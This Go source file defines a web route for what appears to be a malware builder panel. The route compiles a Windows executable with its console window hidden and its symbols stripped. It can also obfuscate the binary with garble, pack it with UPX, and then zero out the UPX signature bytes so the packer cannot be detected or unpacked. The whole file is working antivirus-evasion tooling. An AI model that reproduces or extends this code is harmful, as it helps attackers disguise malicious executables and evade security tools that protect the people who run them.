package routes

import (
	"bytes"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"builder/store"
	"builder/utils"
)

func startBuild() {
	http.HandleFunc("/api/start-build", func(write http.ResponseWriter, req *http.Request) {
		buildDir := filepath.Join(store.Root, ".builds")
		buildName := fmt.Sprintf("%s-%d.exe", store.Tag, time.Now().UnixNano())
		buildPath := filepath.Join(buildDir, buildName)

		buildWith := "go"
		buildArgs := []string{
			"build",
			"-trimpath",
			"-buildvcs=false",
			"-ldflags=-s -w -H windowsgui -buildid=",
			"-o", buildPath,
		}

		if store.Obfuscate {
			buildWith = "garble"
			buildArgs = []string{
				"-tiny", "-seed=random", "build",
				"-trimpath",
				"-buildvcs=false",
				"-ldflags=-s -w -H windowsgui -buildid=",
				"-o", buildPath,
			}
		}

		err := utils.RunCommand(store.Main, buildWith, buildArgs...)
		if err != nil {
			http.Error(write, fmt.Sprintf("failed to build - %s", err), http.StatusInternalServerError)
			return
		}

		if store.Pack {
			packedTemp := buildPath + ".upx"
			err := utils.RunCommand(
				store.Main,
				"upx",
				"-3", // this could probably make it higher but ehhhhh
				"-o", packedTemp,
				buildPath,
			)

			if err != nil {
				http.Error(write, fmt.Sprintf("failed to pack build - %s", err), http.StatusInternalServerError)
				return
			}

			err = os.Rename(packedTemp, buildPath)
			if err != nil {
				http.Error(write, fmt.Sprintf("failed to move packed build - %s", err), http.StatusInternalServerError)
				return
			}

			data, err := os.ReadFile(buildPath)
			if err == nil {
				data = bytes.ReplaceAll(data, []byte("UPX!"), []byte{0x00, 0x00, 0x00, 0x00})
				data = bytes.ReplaceAll(data, []byte("UPX0"), []byte{0x00, 0x00, 0x00, 0x00})
				data = bytes.ReplaceAll(data, []byte("UPX1"), []byte{0x00, 0x00, 0x00, 0x00})
				data = bytes.ReplaceAll(data, []byte("UPX2"), []byte{0x00, 0x00, 0x00, 0x00})

				err = os.WriteFile(buildPath, data, 0666)
				if err != nil {
					http.Error(write, fmt.Sprintf("failed mangle packed build - %s", err), http.StatusInternalServerError)
					return
				}
			}
		}

		write.WriteHeader(http.StatusOK)
	})
}
